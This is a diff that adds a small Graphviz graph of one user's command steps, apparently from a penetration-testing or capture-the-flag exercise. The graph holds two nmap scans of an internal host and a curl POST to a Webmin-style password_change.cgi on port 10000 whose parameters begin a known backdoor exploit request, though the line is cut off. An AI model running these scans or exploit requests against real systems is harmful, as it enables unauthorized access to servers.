@@ -1,0 +1,11 @@
+// creating graph for user: 79
+digraph {
+	node [shape=box]
+	1 [label="nmap -sv 172.18.1.5 A0 M0 A1 "]
+	2 [label="nmap -sV 172.18.1.5 A1 M1 "]
+	4 [label="curl 172.18.1.5:10000/password_change.cgi -d 'user=root&pam=&expired=2 A4 "]
+	0 -> 1 [constraint=false]
+	1 -> 2 [constraint=false]
+	2 -> 4 [constraint=false]
+	rankdir=LR
+}
